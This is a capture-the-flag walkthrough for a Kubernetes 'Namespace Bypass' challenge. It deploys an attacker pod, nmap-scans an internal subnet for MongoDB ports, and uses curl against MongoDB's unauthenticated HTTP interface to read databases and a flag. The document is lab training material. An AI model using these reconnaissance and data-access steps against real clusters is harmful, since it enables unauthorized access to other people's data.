# K8S Security: Namespace Bypass

## Goal

There is a hidden namespace which has a running mongodb instance.  The goal is to find the instance and find the flag.

1. Install an attacker container.

```
kubectl apply -f pentest_tools.yaml
```

2. Log into the attacker container.

```
kubectl get pods
```
```
kubectl exec -it challenge23-attacker-8bd985cb5-lk6dt -- bash
```

3.  Once in the container, get its ip.  I recently learned that the [100.64.0.0/10 space](https://en.wikipedia.org/wiki/IPv4_shared_address_space) is reserved. (!!)

```
ifconfig
```
4. Lets run a nmap scan.  We know from a previous challenge that mongodb is the database of choice. Lets look up its ports to find where mongo is.

```
nmap -p27017,28017 100.96.1.24/24
```

5. We see a host that has these ports open.  **What is port 28017?**

```
curl http://100.96.1.75:28017/listDatabases
```
```
curl http://100.96.1.75:28017/k8ctf/flag/
```

6. Exit

```
exit
```

7. Where is this mongodb running. This is the flag.

```
kubectl get namespaces
```
8. [Submit the flag.](https://devslop.ctfd.io/challenges#Challenge%2023-15)

ðŸš¨**DO NOT DELETE THE pentest tools deployment.**ðŸš¨
